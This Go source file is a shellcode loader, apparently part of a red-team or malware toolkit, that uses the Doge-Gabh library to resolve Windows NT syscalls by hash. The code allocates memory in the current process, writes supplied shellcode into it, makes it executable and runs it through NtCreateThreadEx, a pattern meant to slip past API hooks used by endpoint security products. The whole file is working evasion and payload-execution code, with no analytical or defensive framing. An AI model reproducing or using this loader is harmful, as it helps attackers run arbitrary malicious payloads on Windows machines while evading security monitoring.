package loader

import (
	"fmt"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

const (
	Kernel32 = "kernel32.dll"

	NtCreateThreadEx        = "NtCreateThreadEx"
	NtProtectVirtualMemory  = "NtProtectVirtualMemory"
	NtAllocateVirtualMemory = "NtAllocateVirtualMemory"
	WaitForSingleObject     = "WaitForSingleObject"
	WriteProcessMemory      = "WriteProcessMemory"
)

type SysID struct {
	NtAllocateVirtualSysID *gabh.SPFG
	NtProtectVirtualSysID  *gabh.SPFG
	NtCreateThreadExSysID  *gabh.SPFG
	WaitForSingleObjectPtr uint64
	WriteProcessMemoryPtr  uint64
}

func getSysID() (*SysID, error) {

	avm, err := gabh.MemHgate(Sha256Hex(NtAllocateVirtualMemory), Sha256Hex)
	if err != nil {
		return nil, err
	}

	avmSysID, err := gabh.SpfGate(avm, nil)
	if err != nil {
		return nil, err
	}

	pvm, err := gabh.MemHgate(Sha256Hex(NtProtectVirtualMemory), Sha256Hex)
	if err != nil {
		return nil, err
	}

	pvmSysID, err := gabh.SpfGate(pvm, nil)
	if err != nil {
		return nil, err
	}

	cte, err := gabh.MemHgate(Sha256Hex(NtCreateThreadEx), Sha256Hex)
	if err != nil {
		return nil, err
	}

	cteSysID, err := gabh.SpfGate(cte, nil)
	if err != nil {
		return nil, err
	}

	ptrWaitForSingleObject, _, err := gabh.DiskFuncPtr(
		Kernel32,
		str2sha1(WaitForSingleObject),
		str2sha1,
	)
	if err != nil {
		return nil, err
	}

	ptrWriteProcessMemory, _, err := gabh.DiskFuncPtr(
		Kernel32,
		str2sha1(WriteProcessMemory),
		str2sha1,
	)
	if err != nil {
		return nil, err
	}

	return &SysID{
		NtAllocateVirtualSysID: avmSysID,
		NtProtectVirtualSysID:  pvmSysID,
		NtCreateThreadExSysID:  cteSysID,
		WaitForSingleObjectPtr: ptrWaitForSingleObject,
		WriteProcessMemoryPtr:  ptrWriteProcessMemory,
	}, nil
}

func (s *SysID) spfGate(sc []byte) error {
	procHandle := uintptr(0xffffffffffffffff) // -1 = 当前进程
	regionSize := uintptr(len(sc))
	var baseAddr uintptr

	// 调用 NtAllocateVirtualMemory 分配内存
	r1, _, _ := syscall.SyscallN(
		s.NtAllocateVirtualSysID.Pointer,
		procHandle,
		uintptr(unsafe.Pointer(&baseAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		syscall.PAGE_READWRITE,
		0,
	)
	if r1 != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: %x", r1)
	}
	s.NtAllocateVirtualSysID.Recover()

	r1, _, err := syscall.SyscallN(
		uintptr(s.WriteProcessMemoryPtr),
		procHandle,
		baseAddr,
		uintptr(unsafe.Pointer(&sc[0])),
		uintptr(len(sc)),
		0,
	)
	if r1 == 0 {
		return fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	// 修改内存权限为可执行
	var oldProtect uintptr
	r1, _, _ = syscall.SyscallN(
		s.NtProtectVirtualSysID.Pointer,
		procHandle,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if r1 != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed: %x", r1)
	}
	s.NtProtectVirtualSysID.Recover()

	var hThread uintptr
	r1, _, _ = syscall.SyscallN(
		s.NtCreateThreadExSysID.Pointer,
		uintptr(unsafe.Pointer(&hThread)), // ThreadHandle
		0x1FFFFF,                          // DesiredAccess
		0,                                 // ObjectAttributes
		procHandle,                        // ProcessHandle
		baseAddr,                          // StartRoutine
		0,                                 // Argument
		0,                                 // CreateFlags
		0,                                 // ZeroBits
		0,                                 // StackSize
		0,                                 // MaximumStackSize
		0,                                 // AttributeList
		0,                                 // 保留参数
	)
	if r1 != 0 {
		return fmt.Errorf("NtCreateThreadEx failed: %x", r1)
	}
	s.NtCreateThreadExSysID.Recover()

	r1, _, err = syscall.SyscallN(
		uintptr(s.WaitForSingleObjectPtr),
		hThread,
		windows.INFINITE,
		0,
	)
	if r1 == 0 {
		return fmt.Errorf("WaitForSingleObject failed: %v", err)
	}

	return nil
}

func SPFGate(sc []byte) error {
	ids, err := getSysID()
	if err != nil {
		return err
	}

	err = ids.spfGate(sc)
	if err != nil {
		return err
	}

	return nil
}
